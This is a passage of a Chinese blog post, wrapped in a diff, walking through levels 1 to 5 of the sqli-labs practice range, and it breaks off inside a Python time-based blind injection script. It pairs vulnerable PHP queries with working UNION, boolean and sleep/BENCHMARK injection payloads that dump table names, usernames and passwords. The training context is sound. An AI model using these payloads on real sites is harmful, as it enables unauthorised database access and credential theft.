@@ -1,0 +1,820 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>sqli-labs靶场(1)GET型 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="sqli-labs靶场(1)GET型" />
+<meta property="og:description" content="sqli-labs靶场精简记录1-10" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/sqli-labs_1_get/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:12:00+08:00" />
+<meta property="article:modified_time" content="2023-11-17T00:12:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="sqli-labs靶场(1)GET型"/>
+<meta name="twitter:description" content="sqli-labs靶场精简记录1-10"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/sqli-labs_1_get/" /><link rel="prev" href="http://scofield1920.github.io/sqli-labs_2_post/" /><link rel="next" href="http://scofield1920.github.io/port_scan/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "sqli-labs靶场(1)GET型",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/sqli-labs_1_get\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web, wp, sqli","wordcount":  711 ,
+        "url": "http:\/\/scofield1920.github.io\/sqli-labs_1_get\/","datePublished": "2023-11-17T00:12:00+08:00","dateModified": "2023-11-17T00:12:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-1-get---error-based---single-quotes---string">Less-1 GET - Error based - Single quotes - String</a></li>
+        <li><a href="#less-2get---error-based---intiger-based">Less-2GET - Error based - Intiger based</a></li>
+        <li><a href="#less-3-get---error-based---single-quotes-with-twist-string">Less-3 GET - Error based - Single quotes with twist string</a></li>
+        <li><a href="#less-4-get---error-based---double-quotes---string">Less-4 GET - Error based - Double Quotes - String</a></li>
+        <li><a href="#less-5-get---double-injection---single-quotes---string">Less-5 GET - Double Injection - Single Quotes - String</a>
+          <ul>
+            <li><a href="#基于报错注入">基于报错注入</a></li>
+            <li><a href="#基于时间盲注">基于时间盲注</a></li>
+            <li><a href="#xpath注入">xpath注入</a></li>
+          </ul>
+        </li>
+        <li><a href="#less-6-get---double-injection---double-quotes---string">Less-6 GET - Double Injection - Double Quotes - String</a></li>
+        <li><a href="#less-7-get---dump-into-outfile---string">Less-7 GET - Dump into outfile - String</a></li>
+        <li><a href="#less-8-get---blind---boolian-based---single-quotes">Less-8 GET - Blind - Boolian Based - Single Quotes</a></li>
+        <li><a href="#less-9-get---blind---time-based---single-quotes">Less-9 GET - Blind - Time based. - Single Quotes</a></li>
+        <li><a href="#less-10-get---blind---time-based---double-quotes">Less-10 GET - Blind - Time based - double quotes</a>
+          <ul>
+            <li><a href="#盲注截取函数">盲注截取函数</a></li>
+            <li><a href="#编码函数">编码函数</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">sqli-labs靶场(1)GET型</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;711 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-1-get---error-based---single-quotes---string">Less-1 GET - Error based - Single quotes - String</a></li>
+        <li><a href="#less-2get---error-based---intiger-based">Less-2GET - Error based - Intiger based</a></li>
+        <li><a href="#less-3-get---error-based---single-quotes-with-twist-string">Less-3 GET - Error based - Single quotes with twist string</a></li>
+        <li><a href="#less-4-get---error-based---double-quotes---string">Less-4 GET - Error based - Double Quotes - String</a></li>
+        <li><a href="#less-5-get---double-injection---single-quotes---string">Less-5 GET - Double Injection - Single Quotes - String</a>
+          <ul>
+            <li><a href="#基于报错注入">基于报错注入</a></li>
+            <li><a href="#基于时间盲注">基于时间盲注</a></li>
+            <li><a href="#xpath注入">xpath注入</a></li>
+          </ul>
+        </li>
+        <li><a href="#less-6-get---double-injection---double-quotes---string">Less-6 GET - Double Injection - Double Quotes - String</a></li>
+        <li><a href="#less-7-get---dump-into-outfile---string">Less-7 GET - Dump into outfile - String</a></li>
+        <li><a href="#less-8-get---blind---boolian-based---single-quotes">Less-8 GET - Blind - Boolian Based - Single Quotes</a></li>
+        <li><a href="#less-9-get---blind---time-based---single-quotes">Less-9 GET - Blind - Time based. - Single Quotes</a></li>
+        <li><a href="#less-10-get---blind---time-based---double-quotes">Less-10 GET - Blind - Time based - double quotes</a>
+          <ul>
+            <li><a href="#盲注截取函数">盲注截取函数</a></li>
+            <li><a href="#编码函数">编码函数</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>sqli-labs靶场精简记录1-10</p>
+<h3 id="less-1-get---error-based---single-quotes---string" class="headerLink">
+    <a href="#less-1-get---error-based---single-quotes---string" class="header-mark"></a>Less-1 GET - Error based - Single quotes - String</h3><p>基于错误的GET单引号字符型注入</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3 --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">爆数据库
+</span></span><span class="line"><span class="cl">id=-1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">爆表名
+</span></span><span class="line"><span class="cl">id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">爆字段名
+</span></span><span class="line"><span class="cl">id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">爆数据名
+</span></span><span class="line"><span class="cl">id=-1&#39;union select 1,group_concat(username,password),3 from security.users--+
+</span></span><span class="line"><span class="cl">id=-1&#39;union select 1,group_concat(username,password),3 from users--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-2get---error-based---intiger-based" class="headerLink">
+    <a href="#less-2get---error-based---intiger-based" class="header-mark"></a>Less-2GET - Error based - Intiger based</h3><p>基于错误的GET整型注入</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> $sql=&#34;SELECT * FROM users WHERE id=$id LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/sqli-labs/Less-3/?id=-1 union select 1,2,3 --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-3-get---error-based---single-quotes-with-twist-string" class="headerLink">
+    <a href="#less-3-get---error-based---single-quotes-with-twist-string" class="header-mark"></a>Less-3 GET - Error based - Single quotes with twist string</h3><p>基于错误的GET单引号变形字符型注入</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/sqli-labs/Less-3/?id=-1&#39;) union select 1,2,3 --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-4-get---error-based---double-quotes---string" class="headerLink">
+    <a href="#less-4-get---error-based---double-quotes---string" class="header-mark"></a>Less-4 GET - Error based - Double Quotes - String</h3><p>基于错误的GET双引号字符型注入</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$id = &#39;&#34;&#39; . $id . &#39;&#34;&#39;;
+</span></span><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=($id) LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/sqli-labs/Less-4/?id=-1&#34;) union select 1,2,3 --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-5-get---double-injection---single-quotes---string" class="headerLink">
+    <a href="#less-5-get---double-injection---single-quotes---string" class="header-mark"></a>Less-5 GET - Double Injection - Single Quotes - String</h3><p>双注入GET单引号字符型注入</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&#34;;
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">	print_r(mysql_error());
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload</p>
+<h4 id="基于报错注入" class="headerLink">
+    <a href="#%e5%9f%ba%e4%ba%8e%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="header-mark"></a>基于报错注入</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//判断数据库的长度
+</span></span><span class="line"><span class="cl">?id=1&#39;and length((select database()))&gt;9--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//截取判断对应字符
+</span></span><span class="line"><span class="cl">//substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select database()),1,1))=115--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//判断所有表名字符长度
+</span></span><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//逐一判断表名
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//判断所有字段名的长度
+</span></span><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//逐一判断字段名
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//判断字段内容长度
+</span></span><span class="line"><span class="cl">?id=1&#39; and length((select group_concat(username,password) from users))&gt;109--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//逐一检测内容
+</span></span><span class="line"><span class="cl">?id=1&#39; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="基于时间盲注" class="headerLink">
+    <a href="#%e5%9f%ba%e4%ba%8e%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" class="header-mark"></a>基于时间盲注</h4><p>sleep()函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=1&#39; and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- #
+</span></span><span class="line"><span class="cl">当正确时无明显延迟,错误有明显延迟
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>benchmark () 函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=1&#39; UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1-- #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>script</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding:utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取数据库名长度</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">database_len</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/sqli-labs/Less-5/index.php&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34; ?id=1&#39; and if(length(database())&gt;</span><span class="si">%s</span><span class="s2">,sleep(1),0) --+&#34;</span> <span class="o">%</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># print(url+payload+&#39;%23&#39;)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time1</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time2</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sec</span> <span class="o">=</span> <span class="p">(</span><span class="n">time2</span> <span class="o">-</span> <span class="n">time1</span><span class="p">)</span><span class="o">.</span><span class="n">seconds</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">sec</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;database_len:&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#获取数据库名</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">database_name</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/sqli-labs/Less-5/index.php&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and if(substr(database(),</span><span class="si">%d</span><span class="s2">,1)=&#39;</span><span class="si">%s</span><span class="s2">&#39;,sleep(3),1) --+&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">j</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#print(url+payload)</span>
